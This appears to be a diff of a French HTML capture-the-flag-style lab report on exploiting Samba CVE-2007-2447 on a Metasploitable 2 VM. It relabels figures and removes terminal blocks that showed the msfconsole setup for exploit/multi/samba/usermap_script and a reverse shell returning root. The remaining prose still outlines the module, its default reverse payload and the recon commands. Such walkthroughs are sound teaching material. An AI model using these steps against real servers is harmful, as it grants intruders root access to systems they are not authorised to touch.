@@ -34,11 +34,10 @@
   <figure class="capture" id="cap-recon">
     <img src="../images/ms2-samba-usermap/01-recon-nmap.png" alt="Scan nmap des ports 139 et 445">
     <figcaption>
-      <strong class="idx">1.</strong>
+      <strong class="idx">a.</strong>
       <span class="desc">Résultat de <code>nmap -sV -p 139,445 192.168.56.101</code> : Samba
       <code>smbd 3.X - 4.X</code> (workgroup WORKGROUP). La version exacte (plage 3.0.20–3.0.25)
       sera confirmée par la recherche d'exploit.</span>
-      <span class="fname">images/ms2-samba-usermap/01-recon-nmap.png</span>
     </figcaption>
   </figure>
 
@@ -60,12 +59,6 @@ Samba 3.0.20 < 3.0.25rc3 - 'Username' map script Command Execution | unix/remote
 
   <p>Puis la CVE et le mécanisme :</p>
 
-  <pre class="terminal">$ msfconsole -q -x "info exploit/multi/samba/usermap_script; exit"
-
-References:
-  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
-  http://samba.org/samba/security/CVE-2007-2447.html</pre>
-
   <p>La section <code>References</code> confirme <strong>CVE-2007-2447</strong>. Le module se
   connecte au service et envoie un <strong>nom d'utilisateur forgé</strong> contenant une
   commande shell ; faute d'assainissement, le <code>username map script</code> l'exécute avec
@@ -79,34 +72,24 @@ References:
   <figure class="capture" id="cap-recherche">
     <img src="../images/ms2-samba-usermap/02-recherche-module.png" alt="searchsploit samba puis search usermap_script">
     <figcaption>
-      <strong class="idx">2.</strong>
+      <strong class="idx">b.</strong>
       <span class="desc"><code>searchsploit samba 3.0</code> confirme la faille pour la plage de
       versions, puis <code>search usermap_script</code> donne le chemin du module
       (<code>exploit/multi/samba/usermap_script</code>).</span>
-      <span class="fname">images/ms2-samba-usermap/02-recherche-module.png</span>
     </figcaption>
   </figure>
 
   <figure class="capture" id="cap-info-cve">
     <img src="../images/ms2-samba-usermap/03-info-cve.png" alt="info du module, section References avec la CVE">
     <figcaption>
-      <strong class="idx">3.</strong>
+      <strong class="idx">c.</strong>
       <span class="desc">Résultat de <code>info</code> sur le module : la section
       <code>References</code> donne <strong>CVE-2007-2447</strong>.</span>
-      <span class="fname">images/ms2-samba-usermap/03-info-cve.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">3. Démarche d'exploitation</h2>
   <p>Démarche interactive dans <code>msfconsole</code>, commande par commande :</p>
-
-  <pre class="terminal">msf6 > use exploit/multi/samba/usermap_script
-msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.101
-RHOSTS => 192.168.56.101
-msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.56.1
-LHOST => 192.168.56.1
-msf6 exploit(multi/samba/usermap_script) > set LPORT 4446
-LPORT => 4446</pre>
 
   <p><strong class="field">Point d'attention —</strong> pas de <code>RPORT</code> à régler
   (445 par défaut) ni de <code>payload</code> à changer (<code>cmd/unix/reverse</code> par
@@ -116,25 +99,15 @@ LPORT => 4446</pre>
   <figure class="capture" id="cap-config">
     <img src="../images/ms2-samba-usermap/04-exploit-config.png" alt="Configuration du module avant lancement">
     <figcaption>
-      <strong class="idx">4.</strong>
+      <strong class="idx">d.</strong>
       <span class="desc">Chargement du module et configuration des options (<code>RHOSTS</code>,
       <code>LHOST</code>, <code>LPORT</code>).</span>
-      <span class="fname">images/ms2-samba-usermap/04-exploit-config.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">4. Preuve d'accès obtenu</h2>
   <p><code>run -z</code> déclenche l'attaque ; <code>sessions -c "..." -i 1</code> exécute les
   commandes de preuve dans la session :</p>
-
-  <pre class="terminal">msf6 exploit(multi/samba/usermap_script) > run -z
-[*] Command shell session 1 opened (192.168.56.1:4446 -> 192.168.56.101:40060)
-msf6 exploit(multi/samba/usermap_script) > sessions -c "id; uname -a; hostname; whoami" -i 1
-[*] Running 'id; uname -a; hostname; whoami' on shell session 1 (192.168.56.101)
-uid=0(root) gid=0(root)
-Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
-metasploitable
-root</pre>
 
   <p>L'accès est <strong>root</strong> directement, sans étape d'élévation de privilèges : le
   démon Samba tourne en root, donc la commande injectée via le nom d'utilisateur s'exécute en
@@ -144,11 +117,10 @@ root</pre>
   <figure class="capture" id="cap-preuve">
     <img src="../images/ms2-samba-usermap/05-session-root.png" alt="Shell root confirmé, uid=0">
     <figcaption>
-      <strong class="idx">5.</strong>
+      <strong class="idx">e.</strong>
       <span class="desc">Ouverture de la session et sortie de
       <code>id; uname -a; hostname; whoami</code> : accès confirmé en
       <code>uid=0(root)</code> sur l'hôte <code>metasploitable</code>.</span>
-      <span class="fname">images/ms2-samba-usermap/05-session-root.png</span>
     </figcaption>
   </figure>
 
